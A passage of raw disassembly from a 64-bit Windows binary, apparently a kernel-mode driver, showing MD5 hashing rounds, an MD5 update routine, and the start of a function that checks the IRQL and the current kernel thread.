   140002c6f:	41 c1 c1 05          	rol    $0x5,%r9d
   140002c73:	41 23 ca             	and    %r10d,%ecx
   140002c76:	45 03 ca             	add    %r10d,%r9d
   140002c79:	41 23 c1             	and    %r9d,%eax
   140002c7c:	0b c8                	or     %eax,%ecx
   140002c7e:	03 4d 2f             	add    0x2f(%rbp),%ecx
   140002c81:	44 03 d9             	add    %ecx,%r11d
   140002c84:	41 8b ca             	mov    %r10d,%ecx
   140002c87:	41 c1 c3 09          	rol    $0x9,%r11d
   140002c8b:	f7 d1                	not    %ecx
   140002c8d:	45 03 d9             	add    %r9d,%r11d
   140002c90:	41 23 c9             	and    %r9d,%ecx
   140002c93:	44 8d 82 81 e6 a1 d8 	lea    -0x275e197f(%rdx),%r8d
   140002c9a:	41 8b c3             	mov    %r11d,%eax
   140002c9d:	41 8d 92 c8 fb d3 e7 	lea    -0x182c0438(%r10),%edx
   140002ca4:	41 23 c2             	and    %r10d,%eax
   140002ca7:	45 8d 91 e6 cd e1 21 	lea    0x21e1cde6(%r9),%r10d
   140002cae:	0b c8                	or     %eax,%ecx
   140002cb0:	03 cf                	add    %edi,%ecx
   140002cb2:	44 03 c1             	add    %ecx,%r8d
   140002cb5:	41 8b c9             	mov    %r9d,%ecx
   140002cb8:	f7 d1                	not    %ecx
   140002cba:	41 c1 c0 0e          	rol    $0xe,%r8d
   140002cbe:	41 23 cb             	and    %r11d,%ecx
   140002cc1:	45 03 c3             	add    %r11d,%r8d
   140002cc4:	41 8b c0             	mov    %r8d,%eax
   140002cc7:	41 23 c1             	and    %r9d,%eax
   140002cca:	45 8d 8b d6 07 37 c3 	lea    -0x3cc8f82a(%r11),%r9d
   140002cd1:	0b c8                	or     %eax,%ecx
   140002cd3:	41 8b c3             	mov    %r11d,%eax
   140002cd6:	03 4d 17             	add    0x17(%rbp),%ecx
   140002cd9:	03 d1                	add    %ecx,%edx
   140002cdb:	41 8b cb             	mov    %r11d,%ecx
   140002cde:	f7 d1                	not    %ecx
   140002ce0:	c1 ca 0c             	ror    $0xc,%edx
   140002ce3:	41 23 c8             	and    %r8d,%ecx
   140002ce6:	41 03 d0             	add    %r8d,%edx
   140002ce9:	23 c2                	and    %edx,%eax
   140002ceb:	44 8b da             	mov    %edx,%r11d
   140002cee:	0b c8                	or     %eax,%ecx
   140002cf0:	41 f7 d3             	not    %r11d
   140002cf3:	03 4d 2b             	add    0x2b(%rbp),%ecx
   140002cf6:	41 8b c0             	mov    %r8d,%eax
   140002cf9:	44 03 d1             	add    %ecx,%r10d
   140002cfc:	8d 9a ed 14 5a 45    	lea    0x455a14ed(%rdx),%ebx
   140002d02:	41 c1 c2 05          	rol    $0x5,%r10d
   140002d06:	41 8b c8             	mov    %r8d,%ecx
   140002d09:	f7 d1                	not    %ecx
   140002d0b:	44 03 d2             	add    %edx,%r10d
   140002d0e:	23 ca                	and    %edx,%ecx
   140002d10:	41 23 c2             	and    %r10d,%eax
   140002d13:	0b c8                	or     %eax,%ecx
   140002d15:	45 23 da             	and    %r10d,%r11d
   140002d18:	03 4d 3f             	add    0x3f(%rbp),%ecx
   140002d1b:	44 03 c9             	add    %ecx,%r9d
   140002d1e:	41 8b ca             	mov    %r10d,%ecx
   140002d21:	f7 d1                	not    %ecx
   140002d23:	41 c1 c1 09          	rol    $0x9,%r9d
   140002d27:	45 03 ca             	add    %r10d,%r9d
   140002d2a:	41 23 c9             	and    %r9d,%ecx
   140002d2d:	41 8b c1             	mov    %r9d,%eax
   140002d30:	23 c2                	and    %edx,%eax
   140002d32:	41 8d 92 05 e9 e3 a9 	lea    -0x561c16fb(%r10),%edx
   140002d39:	44 0b d8             	or     %eax,%r11d
   140002d3c:	41 81 c3 87 0d d5 f4 	add    $0xf4d50d87,%r11d
   140002d43:	44 03 5d 13          	add    0x13(%rbp),%r11d
   140002d47:	45 03 d8             	add    %r8d,%r11d
   140002d4a:	41 c1 c3 0e          	rol    $0xe,%r11d
   140002d4e:	45 03 d9             	add    %r9d,%r11d
   140002d51:	41 8b c3             	mov    %r11d,%eax
   140002d54:	41 23 c2             	and    %r10d,%eax
   140002d57:	0b c8                	or     %eax,%ecx
   140002d59:	41 8b c1             	mov    %r9d,%eax
   140002d5c:	03 4d 27             	add    0x27(%rbp),%ecx
   140002d5f:	03 d9                	add    %ecx,%ebx
   140002d61:	41 8b c9             	mov    %r9d,%ecx
   140002d64:	f7 d1                	not    %ecx
   140002d66:	c1 cb 0c             	ror    $0xc,%ebx
   140002d69:	41 23 cb             	and    %r11d,%ecx
   140002d6c:	41 03 db             	add    %r11d,%ebx
   140002d6f:	23 c3                	and    %ebx,%eax
   140002d71:	0b c8                	or     %eax,%ecx
   140002d73:	41 8b c3             	mov    %r11d,%eax
   140002d76:	03 4d 3b             	add    0x3b(%rbp),%ecx
   140002d79:	03 d1                	add    %ecx,%edx
   140002d7b:	41 8b cb             	mov    %r11d,%ecx
   140002d7e:	c1 c2 05             	rol    $0x5,%edx
   140002d81:	f7 d1                	not    %ecx
   140002d83:	03 d3                	add    %ebx,%edx
   140002d85:	23 cb                	and    %ebx,%ecx
   140002d87:	23 c2                	and    %edx,%eax
   140002d89:	0b c8                	or     %eax,%ecx
   140002d8b:	03 4d 0f             	add    0xf(%rbp),%ecx
   140002d8e:	45 8d 81 f8 a3 ef fc 	lea    -0x3105c08(%r9),%r8d
   140002d95:	44 03 c1             	add    %ecx,%r8d
   140002d98:	45 8d 8b d9 02 6f 67 	lea    0x676f02d9(%r11),%r9d
   140002d9f:	44 8b d2             	mov    %edx,%r10d
   140002da2:	41 c1 c0 09          	rol    $0x9,%r8d
   140002da6:	44 03 c2             	add    %edx,%r8d
   140002da9:	41 f7 d2             	not    %r10d
   140002dac:	45 23 d0             	and    %r8d,%r10d
   140002daf:	41 8b c0             	mov    %r8d,%eax
   140002db2:	23 c3                	and    %ebx,%eax
   140002db4:	8b cb                	mov    %ebx,%ecx
   140002db6:	f7 d1                	not    %ecx
   140002db8:	23 ca                	and    %edx,%ecx
   140002dba:	0b c8                	or     %eax,%ecx
   140002dbc:	03 4d 23             	add    0x23(%rbp),%ecx
   140002dbf:	44 03 c9             	add    %ecx,%r9d
   140002dc2:	41 c1 c1 0e          	rol    $0xe,%r9d
   140002dc6:	45 03 c8             	add    %r8d,%r9d
   140002dc9:	41 8b c1             	mov    %r9d,%eax
   140002dcc:	23 c2                	and    %edx,%eax
   140002dce:	44 0b d0             	or     %eax,%r10d
   140002dd1:	41 8b c0             	mov    %r8d,%eax
   140002dd4:	41 33 c1             	xor    %r9d,%eax
   140002dd7:	41 81 c2 8a 4c 2a 8d 	add    $0x8d2a4c8a,%r10d
   140002dde:	44 03 55 37          	add    0x37(%rbp),%r10d
   140002de2:	44 03 d3             	add    %ebx,%r10d
   140002de5:	41 c1 ca 0c          	ror    $0xc,%r10d
   140002de9:	45 03 d1             	add    %r9d,%r10d
   140002dec:	41 33 c2             	xor    %r10d,%eax
   140002def:	05 42 39 fa ff       	add    $0xfffa3942,%eax
   140002df4:	03 45 1b             	add    0x1b(%rbp),%eax
   140002df7:	03 d0                	add    %eax,%edx
   140002df9:	41 8b c1             	mov    %r9d,%eax
   140002dfc:	41 33 c2             	xor    %r10d,%eax
   140002dff:	c1 c2 04             	rol    $0x4,%edx
   140002e02:	41 03 d2             	add    %r10d,%edx
   140002e05:	33 c2                	xor    %edx,%eax
   140002e07:	05 81 f6 71 87       	add    $0x8771f681,%eax
   140002e0c:	03 45 27             	add    0x27(%rbp),%eax
   140002e0f:	44 03 c0             	add    %eax,%r8d
   140002e12:	44 8d 9a 44 ea be a4 	lea    -0x5b4115bc(%rdx),%r11d
   140002e19:	41 c1 c0 0b          	rol    $0xb,%r8d
   140002e1d:	44 03 c2             	add    %edx,%r8d
   140002e20:	41 8b c0             	mov    %r8d,%eax
   140002e23:	41 8b c8             	mov    %r8d,%ecx
   140002e26:	41 33 c2             	xor    %r10d,%eax
   140002e29:	33 c2                	xor    %edx,%eax
   140002e2b:	05 22 61 9d 6d       	add    $0x6d9d6122,%eax
   140002e30:	03 45 33             	add    0x33(%rbp),%eax
   140002e33:	44 03 c8             	add    %eax,%r9d
   140002e36:	41 c1 c1 10          	rol    $0x10,%r9d
   140002e3a:	45 03 c8             	add    %r8d,%r9d
   140002e3d:	41 33 c9             	xor    %r9d,%ecx
   140002e40:	8b c1                	mov    %ecx,%eax
   140002e42:	33 c2                	xor    %edx,%eax
   140002e44:	41 8d 90 a9 cf de 4b 	lea    0x4bdecfa9(%r8),%edx
   140002e4b:	05 0c 38 e5 fd       	add    $0xfde5380c,%eax
   140002e50:	45 8d 81 60 4b bb f6 	lea    -0x944b4a0(%r9),%r8d
   140002e57:	03 45 3f             	add    0x3f(%rbp),%eax
   140002e5a:	44 03 d0             	add    %eax,%r10d
   140002e5d:	41 8b c1             	mov    %r9d,%eax
   140002e60:	41 c1 ca 09          	ror    $0x9,%r10d
   140002e64:	45 03 d1             	add    %r9d,%r10d
   140002e67:	41 33 c2             	xor    %r10d,%eax
   140002e6a:	41 33 ca             	xor    %r10d,%ecx
   140002e6d:	03 4d 0b             	add    0xb(%rbp),%ecx
   140002e70:	44 03 d9             	add    %ecx,%r11d
   140002e73:	41 c1 c3 04          	rol    $0x4,%r11d
   140002e77:	45 03 da             	add    %r10d,%r11d
   140002e7a:	41 33 c3             	xor    %r11d,%eax
   140002e7d:	03 45 17             	add    0x17(%rbp),%eax
   140002e80:	03 d0                	add    %eax,%edx
   140002e82:	c1 c2 0b             	rol    $0xb,%edx
   140002e85:	41 03 d3             	add    %r11d,%edx
   140002e88:	8b c2                	mov    %edx,%eax
   140002e8a:	41 33 c2             	xor    %r10d,%eax
   140002e8d:	41 33 c3             	xor    %r11d,%eax
   140002e90:	03 45 23             	add    0x23(%rbp),%eax
   140002e93:	44 03 c0             	add    %eax,%r8d
   140002e96:	41 c1 c0 10          	rol    $0x10,%r8d
   140002e9a:	44 03 c2             	add    %edx,%r8d
   140002e9d:	45 8d 8a 70 bc bf be 	lea    -0x41404390(%r10),%r9d
   140002ea4:	8b ca                	mov    %edx,%ecx
   140002ea6:	45 8d 93 c6 7e 9b 28 	lea    0x289b7ec6(%r11),%r10d
   140002ead:	41 33 c8             	xor    %r8d,%ecx
   140002eb0:	8b c1                	mov    %ecx,%eax
   140002eb2:	41 33 c3             	xor    %r11d,%eax
   140002eb5:	44 8d 9a fa 27 a1 ea 	lea    -0x155ed806(%rdx),%r11d
   140002ebc:	03 45 2f             	add    0x2f(%rbp),%eax
   140002ebf:	44 03 c8             	add    %eax,%r9d
   140002ec2:	41 8b c0             	mov    %r8d,%eax
   140002ec5:	41 c1 c9 09          	ror    $0x9,%r9d
   140002ec9:	45 03 c8             	add    %r8d,%r9d
   140002ecc:	41 33 c1             	xor    %r9d,%eax
   140002ecf:	41 33 c9             	xor    %r9d,%ecx
   140002ed2:	03 4d 3b             	add    0x3b(%rbp),%ecx
   140002ed5:	44 03 d1             	add    %ecx,%r10d
   140002ed8:	41 c1 c2 04          	rol    $0x4,%r10d
   140002edc:	41 8d 91 05 1d 88 04 	lea    0x4881d05(%r9),%edx
   140002ee3:	45 03 d1             	add    %r9d,%r10d
   140002ee6:	41 33 c2             	xor    %r10d,%eax
   140002ee9:	03 45 07             	add    0x7(%rbp),%eax
   140002eec:	44 03 d8             	add    %eax,%r11d
   140002eef:	41 c1 c3 0b          	rol    $0xb,%r11d
   140002ef3:	45 03 da             	add    %r10d,%r11d
   140002ef6:	41 8b c3             	mov    %r11d,%eax
   140002ef9:	41 8b cb             	mov    %r11d,%ecx
   140002efc:	41 33 c1             	xor    %r9d,%eax
   140002eff:	45 8d 8a 39 d0 d4 d9 	lea    -0x262b2fc7(%r10),%r9d
   140002f06:	41 33 c2             	xor    %r10d,%eax
   140002f09:	05 85 30 ef d4       	add    $0xd4ef3085,%eax
   140002f0e:	03 45 13             	add    0x13(%rbp),%eax
   140002f11:	44 03 c0             	add    %eax,%r8d
   140002f14:	41 c1 c0 10          	rol    $0x10,%r8d
   140002f18:	45 03 c3             	add    %r11d,%r8d
   140002f1b:	41 33 c8             	xor    %r8d,%ecx
   140002f1e:	8b c1                	mov    %ecx,%eax
   140002f20:	41 33 c2             	xor    %r10d,%eax
   140002f23:	03 45 1f             	add    0x1f(%rbp),%eax
   140002f26:	45 8d 90 f8 7c a2 1f 	lea    0x1fa27cf8(%r8),%r10d
   140002f2d:	03 d0                	add    %eax,%edx
   140002f2f:	c1 ca 09             	ror    $0x9,%edx
   140002f32:	41 03 d0             	add    %r8d,%edx
   140002f35:	33 ca                	xor    %edx,%ecx
   140002f37:	03 4d 2b             	add    0x2b(%rbp),%ecx
   140002f3a:	44 03 c9             	add    %ecx,%r9d
   140002f3d:	41 8b c8             	mov    %r8d,%ecx
   140002f40:	33 ca                	xor    %edx,%ecx
   140002f42:	41 c1 c1 04          	rol    $0x4,%r9d
   140002f46:	44 03 ca             	add    %edx,%r9d
   140002f49:	44 8d 82 65 56 ac c4 	lea    -0x3b53a99b(%rdx),%r8d
   140002f50:	41 33 c9             	xor    %r9d,%ecx
   140002f53:	81 c1 e5 99 db e6    	add    $0xe6db99e5,%ecx
   140002f59:	03 4d 37             	add    0x37(%rbp),%ecx
   140002f5c:	41 03 cb             	add    %r11d,%ecx
   140002f5f:	c1 c1 0b             	rol    $0xb,%ecx
   140002f62:	41 03 c9             	add    %r9d,%ecx
   140002f65:	8b c1                	mov    %ecx,%eax
   140002f67:	33 c2                	xor    %edx,%eax
   140002f69:	41 8d 91 44 22 29 f4 	lea    -0xbd6ddbc(%r9),%edx
   140002f70:	41 33 c1             	xor    %r9d,%eax
   140002f73:	03 c7                	add    %edi,%eax
   140002f75:	44 03 d0             	add    %eax,%r10d
   140002f78:	8b c1                	mov    %ecx,%eax
   140002f7a:	41 c1 c2 10          	rol    $0x10,%r10d
   140002f7e:	44 03 d1             	add    %ecx,%r10d
   140002f81:	41 33 c2             	xor    %r10d,%eax
   140002f84:	41 33 c1             	xor    %r9d,%eax
   140002f87:	03 45 0f             	add    0xf(%rbp),%eax
   140002f8a:	44 03 c0             	add    %eax,%r8d
   140002f8d:	8b c1                	mov    %ecx,%eax
   140002f8f:	f7 d0                	not    %eax
   140002f91:	41 c1 c8 09          	ror    $0x9,%r8d
   140002f95:	45 03 c2             	add    %r10d,%r8d
   140002f98:	41 0b c0             	or     %r8d,%eax
   140002f9b:	41 33 c2             	xor    %r10d,%eax
   140002f9e:	03 45 07             	add    0x7(%rbp),%eax
   140002fa1:	03 d0                	add    %eax,%edx
   140002fa3:	41 8b c2             	mov    %r10d,%eax
   140002fa6:	c1 c2 06             	rol    $0x6,%edx
   140002fa9:	41 03 d0             	add    %r8d,%edx
   140002fac:	f7 d0                	not    %eax
   140002fae:	44 8d 89 97 ff 2a 43 	lea    0x432aff97(%rcx),%r9d
   140002fb5:	0b c2                	or     %edx,%eax
   140002fb7:	41 8d 8a a7 23 94 ab 	lea    -0x546bdc59(%r10),%ecx
   140002fbe:	41 33 c0             	xor    %r8d,%eax
   140002fc1:	45 8d 90 39 a0 93 fc 	lea    -0x36c5fc7(%r8),%r10d
   140002fc8:	03 45 23             	add    0x23(%rbp),%eax
   140002fcb:	44 03 c8             	add    %eax,%r9d
   140002fce:	41 8b c0             	mov    %r8d,%eax
   140002fd1:	f7 d0                	not    %eax
   140002fd3:	41 c1 c1 0a          	rol    $0xa,%r9d
   140002fd7:	44 03 ca             	add    %edx,%r9d
   140002fda:	44 8d 82 c3 59 5b 65 	lea    0x655b59c3(%rdx),%r8d
   140002fe1:	41 0b c1             	or     %r9d,%eax
   140002fe4:	33 c2                	xor    %edx,%eax
   140002fe6:	03 45 3f             	add    0x3f(%rbp),%eax
   140002fe9:	03 c8                	add    %eax,%ecx
   140002feb:	8b c2                	mov    %edx,%eax
   140002fed:	f7 d0                	not    %eax
   140002fef:	c1 c1 0f             	rol    $0xf,%ecx
   140002ff2:	41 03 c9             	add    %r9d,%ecx
   140002ff5:	41 8d 91 92 cc 0c 8f 	lea    -0x70f3336e(%r9),%edx
   140002ffc:	0b c1                	or     %ecx,%eax
   140002ffe:	41 33 c1             	xor    %r9d,%eax
   140003001:	03 45 1b             	add    0x1b(%rbp),%eax
   140003004:	44 03 d0             	add    %eax,%r10d
   140003007:	41 8b c1             	mov    %r9d,%eax
   14000300a:	f7 d0                	not    %eax
   14000300c:	41 c1 ca 0b          	ror    $0xb,%r10d
   140003010:	44 03 d1             	add    %ecx,%r10d
   140003013:	44 8d 89 7d f4 ef ff 	lea    -0x100b83(%rcx),%r9d
   14000301a:	41 0b c2             	or     %r10d,%eax
   14000301d:	33 c1                	xor    %ecx,%eax
   14000301f:	03 45 37             	add    0x37(%rbp),%eax
   140003022:	44 03 c0             	add    %eax,%r8d
   140003025:	8b c1                	mov    %ecx,%eax
   140003027:	f7 d0                	not    %eax
   140003029:	41 c1 c0 06          	rol    $0x6,%r8d
   14000302d:	45 03 c2             	add    %r10d,%r8d
   140003030:	41 8d 8a d1 5d 84 85 	lea    -0x7a7ba22f(%r10),%ecx
   140003037:	41 0b c0             	or     %r8d,%eax
   14000303a:	41 33 c2             	xor    %r10d,%eax
   14000303d:	03 45 13             	add    0x13(%rbp),%eax
   140003040:	03 d0                	add    %eax,%edx
   140003042:	41 8b c2             	mov    %r10d,%eax
   140003045:	f7 d0                	not    %eax
   140003047:	c1 c2 0a             	rol    $0xa,%edx
   14000304a:	41 03 d0             	add    %r8d,%edx
   14000304d:	45 8d 90 4f 7e a8 6f 	lea    0x6fa87e4f(%r8),%r10d
   140003054:	0b c2                	or     %edx,%eax
   140003056:	41 33 c0             	xor    %r8d,%eax
   140003059:	03 45 2f             	add    0x2f(%rbp),%eax
   14000305c:	44 03 c8             	add    %eax,%r9d
   14000305f:	44 8d 9a e0 e6 2c fe 	lea    -0x1d31920(%rdx),%r11d
   140003066:	41 c1 c1 0f          	rol    $0xf,%r9d
   14000306a:	41 8b c0             	mov    %r8d,%eax
   14000306d:	f7 d0                	not    %eax
   14000306f:	44 03 ca             	add    %edx,%r9d
   140003072:	41 0b c1             	or     %r9d,%eax
   140003075:	33 c2                	xor    %edx,%eax
   140003077:	03 45 0b             	add    0xb(%rbp),%eax
   14000307a:	03 c8                	add    %eax,%ecx
   14000307c:	8b c2                	mov    %edx,%eax
   14000307e:	f7 d0                	not    %eax
   140003080:	c1 c9 0b             	ror    $0xb,%ecx
   140003083:	41 03 c9             	add    %r9d,%ecx
   140003086:	0b c1                	or     %ecx,%eax
   140003088:	41 33 c1             	xor    %r9d,%eax
   14000308b:	03 45 27             	add    0x27(%rbp),%eax
   14000308e:	44 03 d0             	add    %eax,%r10d
   140003091:	41 8b c1             	mov    %r9d,%eax
   140003094:	f7 d0                	not    %eax
   140003096:	41 c1 c2 06          	rol    $0x6,%r10d
   14000309a:	44 03 d1             	add    %ecx,%r10d
   14000309d:	41 0b c2             	or     %r10d,%eax
   1400030a0:	33 c1                	xor    %ecx,%eax
   1400030a2:	03 c7                	add    %edi,%eax
   1400030a4:	44 03 d8             	add    %eax,%r11d
   1400030a7:	8b c1                	mov    %ecx,%eax
   1400030a9:	41 c1 c3 0a          	rol    $0xa,%r11d
   1400030ad:	45 03 da             	add    %r10d,%r11d
   1400030b0:	f7 d0                	not    %eax
   1400030b2:	8d 99 a1 11 08 4e    	lea    0x4e0811a1(%rcx),%ebx
   1400030b8:	41 0b c3             	or     %r11d,%eax
   1400030bb:	45 8b c3             	mov    %r11d,%r8d
   1400030be:	41 33 c2             	xor    %r10d,%eax
   1400030c1:	41 f7 d0             	not    %r8d
   1400030c4:	05 14 43 01 a3       	add    $0xa3014314,%eax
   1400030c9:	03 45 1f             	add    0x1f(%rbp),%eax
   1400030cc:	44 03 c8             	add    %eax,%r9d
   1400030cf:	41 8b c2             	mov    %r10d,%eax
   1400030d2:	f7 d0                	not    %eax
   1400030d4:	41 c1 c1 0f          	rol    $0xf,%r9d
   1400030d8:	45 03 cb             	add    %r11d,%r9d
   1400030db:	41 0b c1             	or     %r9d,%eax
   1400030de:	41 8b d1             	mov    %r9d,%edx
   1400030e1:	41 33 c3             	xor    %r11d,%eax
   1400030e4:	f7 d2                	not    %edx
   1400030e6:	03 45 3b             	add    0x3b(%rbp),%eax
   1400030e9:	03 d8                	add    %eax,%ebx
   1400030eb:	41 8d 89 bb d2 d7 2a 	lea    0x2ad7d2bb(%r9),%ecx
   1400030f2:	c1 cb 0b             	ror    $0xb,%ebx
   1400030f5:	41 03 d9             	add    %r9d,%ebx
   1400030f8:	44 0b c3             	or     %ebx,%r8d
   1400030fb:	8b c3                	mov    %ebx,%eax
   1400030fd:	f7 d0                	not    %eax
   1400030ff:	45 33 c1             	xor    %r9d,%r8d
   140003102:	4c 8b 4d f7          	mov    -0x9(%rbp),%r9
   140003106:	41 81 c0 82 7e 53 f7 	add    $0xf7537e82,%r8d
   14000310d:	44 03 45 17          	add    0x17(%rbp),%r8d
   140003111:	45 03 c2             	add    %r10d,%r8d
   140003114:	41 c1 c0 06          	rol    $0x6,%r8d
   140003118:	44 03 c3             	add    %ebx,%r8d
   14000311b:	41 0b d0             	or     %r8d,%edx
   14000311e:	33 d3                	xor    %ebx,%edx
   140003120:	81 c2 35 f2 3a bd    	add    $0xbd3af235,%edx
   140003126:	03 55 33             	add    0x33(%rbp),%edx
   140003129:	41 03 d3             	add    %r11d,%edx
   14000312c:	c1 c2 0a             	rol    $0xa,%edx
   14000312f:	41 03 d0             	add    %r8d,%edx
   140003132:	0b c2                	or     %edx,%eax
   140003134:	41 33 c0             	xor    %r8d,%eax
   140003137:	03 45 0f             	add    0xf(%rbp),%eax
   14000313a:	03 c8                	add    %eax,%ecx
   14000313c:	8b 45 e7             	mov    -0x19(%rbp),%eax
   14000313f:	41 03 c0             	add    %r8d,%eax
   140003142:	c1 c1 0f             	rol    $0xf,%ecx
   140003145:	41 89 01             	mov    %eax,(%r9)
   140003148:	03 ca                	add    %edx,%ecx
   14000314a:	41 f7 d0             	not    %r8d
   14000314d:	8d 83 91 d3 86 eb    	lea    -0x14792c6f(%rbx),%eax
   140003153:	44 0b c1             	or     %ecx,%r8d
   140003156:	44 33 c2             	xor    %edx,%r8d
   140003159:	44 03 45 2b          	add    0x2b(%rbp),%r8d
   14000315d:	41 03 c0             	add    %r8d,%eax
   140003160:	c1 c8 0b             	ror    $0xb,%eax
   140003163:	03 45 eb             	add    -0x15(%rbp),%eax
   140003166:	03 c1                	add    %ecx,%eax
   140003168:	41 89 41 04          	mov    %eax,0x4(%r9)
   14000316c:	8b 45 ef             	mov    -0x11(%rbp),%eax
   14000316f:	03 c1                	add    %ecx,%eax
   140003171:	48 8d 4d 07          	lea    0x7(%rbp),%rcx
   140003175:	41 89 41 08          	mov    %eax,0x8(%r9)
   140003179:	8b 45 f3             	mov    -0xd(%rbp),%eax
   14000317c:	03 c2                	add    %edx,%eax
   14000317e:	33 d2                	xor    %edx,%edx
   140003180:	41 89 41 0c          	mov    %eax,0xc(%r9)
   140003184:	44 8d 42 40          	lea    0x40(%rdx),%r8d
   140003188:	e8 f3 42 00 00       	call   0x140007480
   14000318d:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140003191:	48 33 cc             	xor    %rsp,%rcx
   140003194:	e8 17 3f 00 00       	call   0x1400070b0
   140003199:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   1400031a0:	00 
   1400031a1:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400031a5:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   1400031a9:	49 8b e3             	mov    %r11,%rsp
   1400031ac:	5d                   	pop    %rbp
   1400031ad:	c3                   	ret
   1400031ae:	cc                   	int3
   1400031af:	cc                   	int3
   1400031b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400031b5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400031ba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400031bf:	57                   	push   %rdi
   1400031c0:	48 83 ec 20          	sub    $0x20,%rsp
   1400031c4:	8b 41 10             	mov    0x10(%rcx),%eax
   1400031c7:	48 8b f9             	mov    %rcx,%rdi
   1400031ca:	44 8b d0             	mov    %eax,%r10d
   1400031cd:	41 8b f0             	mov    %r8d,%esi
   1400031d0:	41 c1 ea 03          	shr    $0x3,%r10d
   1400031d4:	48 8b ea             	mov    %rdx,%rbp
   1400031d7:	41 83 e2 3f          	and    $0x3f,%r10d
   1400031db:	46 8d 0c c0          	lea    (%rax,%r8,8),%r9d
   1400031df:	42 8d 04 c5 00 00 00 	lea    0x0(,%r8,8),%eax
   1400031e6:	00 
   1400031e7:	44 89 49 10          	mov    %r9d,0x10(%rcx)
   1400031eb:	8b 49 14             	mov    0x14(%rcx),%ecx
   1400031ee:	44 3b c8             	cmp    %eax,%r9d
   1400031f1:	73 02                	jae    0x1400031f5
   1400031f3:	ff c1                	inc    %ecx
   1400031f5:	8b c6                	mov    %esi,%eax
   1400031f7:	bb 40 00 00 00       	mov    $0x40,%ebx
   1400031fc:	c1 e8 1d             	shr    $0x1d,%eax
   1400031ff:	41 2b da             	sub    %r10d,%ebx
   140003202:	03 c1                	add    %ecx,%eax
   140003204:	89 47 14             	mov    %eax,0x14(%rdi)
   140003207:	3b f3                	cmp    %ebx,%esi
   140003209:	72 3c                	jb     0x140003247
   14000320b:	41 8b c2             	mov    %r10d,%eax
   14000320e:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   140003212:	48 03 c8             	add    %rax,%rcx
   140003215:	44 8b c3             	mov    %ebx,%r8d
   140003218:	e8 a3 3f 00 00       	call   0x1400071c0
   14000321d:	48 8d 57 18          	lea    0x18(%rdi),%rdx
   140003221:	48 8b cf             	mov    %rdi,%rcx
   140003224:	e8 ef f6 ff ff       	call   0x140002918
   140003229:	eb 10                	jmp    0x14000323b
   14000322b:	8b d3                	mov    %ebx,%edx
   14000322d:	48 8b cf             	mov    %rdi,%rcx
   140003230:	48 03 d5             	add    %rbp,%rdx
   140003233:	e8 e0 f6 ff ff       	call   0x140002918
   140003238:	83 c3 40             	add    $0x40,%ebx
   14000323b:	8d 43 3f             	lea    0x3f(%rbx),%eax
   14000323e:	3b c6                	cmp    %esi,%eax
   140003240:	72 e9                	jb     0x14000322b
   140003242:	45 33 d2             	xor    %r10d,%r10d
   140003245:	eb 02                	jmp    0x140003249
   140003247:	33 db                	xor    %ebx,%ebx
   140003249:	2b f3                	sub    %ebx,%esi
   14000324b:	41 8b c2             	mov    %r10d,%eax
   14000324e:	8b d3                	mov    %ebx,%edx
   140003250:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   140003254:	44 8b c6             	mov    %esi,%r8d
   140003257:	48 03 d5             	add    %rbp,%rdx
   14000325a:	48 03 c8             	add    %rax,%rcx
   14000325d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003262:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003267:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000326c:	48 83 c4 20          	add    $0x20,%rsp
   140003270:	5f                   	pop    %rdi
   140003271:	e9 4a 3f 00 00       	jmp    0x1400071c0
   140003276:	cc                   	int3
   140003277:	cc                   	int3
   140003278:	cc                   	int3
   140003279:	cc                   	int3
   14000327a:	cc                   	int3
   14000327b:	cc                   	int3
   14000327c:	cc                   	int3
   14000327d:	cc                   	int3
   14000327e:	cc                   	int3
   14000327f:	cc                   	int3
   140003280:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003285:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000328a:	56                   	push   %rsi
   14000328b:	57                   	push   %rdi
   14000328c:	41 56                	push   %r14
   14000328e:	48 83 ec 20          	sub    $0x20,%rsp
   140003292:	45 33 f6             	xor    %r14d,%r14d
   140003295:	49 8b f8             	mov    %r8,%rdi
   140003298:	41 8b f6             	mov    %r14d,%esi
   14000329b:	44 0f 20 c0          	mov    %cr8,%rax
   14000329f:	84 c0                	test   %al,%al
   1400032a1:	0f 85 b4 01 00 00    	jne    0x14000345b
   1400032a7:	65 48 8b 04 25 88 01 	mov    %gs:0x188,%rax
   1400032ae:	00 00 
   1400032b0:	48 39 05 e1 85 00 00 	cmp    %rax,0x85e1(%rip)        # 0x14000b898
   1400032b7:	0f 84 9e 01 00 00    	je     0x14000345b
   1400032bd:	0f b7 05 1c b0 00 00 	movzwl 0xb01c(%rip),%eax        # 0x14000e2e0
   1400032c4:	66 f7 d8             	neg    %ax
   1400032c7:	48 8d 05 12 aa 00 00 	lea    0xaa12(%rip),%rax        # 0x14000dce0
   1400032ce:	48 1b db             	sbb    %rbx,%rbx
   1400032d1:	48 23 d8             	and    %rax,%rbx
   1400032d4:	48 85 d2             	test   %rdx,%rdx
   1400032d7:	0f 84 de 00 00 00    	je     0x1400033bb
   1400032dd:	48 83 ea 01          	sub    $0x1,%rdx
   1400032e1:	74 0a                	je     0x1400032ed
   1400032e3:	48 83 fa 01          	cmp    $0x1,%rdx
   1400032e7:	0f 85 6a 01 00 00    	jne    0x140003457
   1400032ed:	48 85 ff             	test   %rdi,%rdi
   1400032f0:	0f 84 61 01 00 00    	je     0x140003457
   1400032f6:	48 8b cf             	mov    %rdi,%rcx
   1400032f9:	ff 15 79 4e 00 00    	call   *0x4e79(%rip)        # 0x140008178
   1400032ff:	84 c0                	test   %al,%al
   140003301:	0f 84 50 01 00 00    	je     0x140003457
   140003307:	48 8b 17             	mov    (%rdi),%rdx
   14000330a:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   14000330f:	45 33 c0             	xor    %r8d,%r8d
